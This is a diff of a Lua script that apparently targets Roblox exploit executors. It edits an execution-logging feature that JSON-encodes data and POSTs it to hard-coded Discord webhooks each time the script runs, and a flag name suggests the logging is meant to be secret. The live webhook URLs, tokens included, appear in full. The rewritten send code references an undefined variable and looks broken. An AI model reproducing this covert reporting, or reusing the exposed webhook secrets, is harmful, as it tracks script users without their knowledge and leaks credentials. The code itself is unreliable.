@@ -28,10 +28,7 @@ Players.LocalPlayer.CharacterAdded:Connect(function(NewCharacter)
 end)
 ----------------------------------------------------------------------------------------------
 
-getgenv().webhookexecUrl = {
-    "https://discord.com/api/webhooks/1366430186026827917/bcA6nXI-qwjvBlDAK35478Px_StH026x5A4bVO8bYaMVUT2U9NKXWIFQE_7o6ccsfb6Y",
-    "https://discord.com/api/webhooks/1371748529965629540/zLaoxYBoPgL4_tFC2KqqxtGwxgHXcv2HbFsxl_Iug1yPlXQ_mBzaYRegUo8A5WqsuR0U"
-}  -- Put your Webhook Url here
+getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1371748529965629540/zLaoxYBoPgL4_tFC2KqqxtGwxgHXcv2HbFsxl_Iug1yPlXQ_mBzaYRegUo8A5WqsuR0U"  -- Put your Webhook Url here
 getgenv().ExecLogSecret = false
 
 local ui = gethui()
@@ -246,21 +243,11 @@ else
         )
     end
 
-local newdata = game:GetService("HttpService"):JSONEncode(data)
-local headers = {
-    ["content-type"] = "application/json"
-}
-request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
-
--- Loop through each webhook in the list
-for _, webhookUrl in ipairs(getgenv().webhookexecUrl) do
-    if type(webhookUrl) == "string" and webhookUrl ~= "" then
-        local abcdef = {
-            Url = webhookUrl,
-            Body = newdata,
-            Method = "POST",
-            Headers = headers
-        }
-        request(abcdef)
-    end
+    local newdata = game:GetService("HttpService"):JSONEncode(data)
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+    request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
+    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+    request(abcdef)
 end
